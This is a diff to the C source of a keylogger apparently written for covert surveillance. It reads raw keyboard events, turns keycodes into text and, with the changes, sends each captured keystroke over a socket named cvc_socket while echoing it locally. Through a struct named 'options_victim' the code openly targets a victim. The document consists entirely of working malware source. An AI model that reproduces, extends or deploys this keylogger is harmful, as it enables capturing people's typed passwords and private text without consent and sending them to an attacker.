@@ -29,7 +29,7 @@ void keylogger(int keyboard, int monitor_fd, struct options_victim* ov) {
                 if (events[i].value == 1) {
                     if (events[i].code > 0 && events[i].code < NUM_KEYCODES) {
                         safe_write_all(monitor_fd, keycodes[events[i].code], keyboard, ov);
-                        safe_write_all(monitor_fd, "\n", keyboard, ov);
+//                        safe_write_all(monitor_fd, "\n", keyboard, ov);
                     }
                     else {
                         write(monitor_fd, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
@@ -38,7 +38,7 @@ void keylogger(int keyboard, int monitor_fd, struct options_victim* ov) {
             }
         }
     }
-    if (bytesRead > 0) safe_write_all(monitor_fd, "\n", keyboard, ov);
+//    if (bytesRead > 0) safe_write_all(monitor_fd, "\n", keyboard, ov);
 }
 
 
@@ -63,15 +63,16 @@ void safe_write_all(int file_desc, const char *str, int keyboard, struct options
 
 int write_all(int file_desc, const char *str, struct options_victim* ov) {
     int bytesWritten = 0;
-    int bytesToWrite = (int)strlen(str) + 1;
+    int bytesToWrite = (int)strlen(str);
 
     uint16_t size = (uint16_t)strlen(str);
 
 
     do {
-        bytesWritten = (int)write(file_desc, str, bytesToWrite);
+//        bytesWritten = (int)write(file_desc, str, bytesToWrite);
         // TODO: CREATE RAW PACKET
-        write(ov->cvc_socket, str, size);
+        printf("%s", str);
+        bytesWritten = (int)write(ov->cvc_socket, str, size);
         if(bytesWritten == -1) {
             return 0;
         }
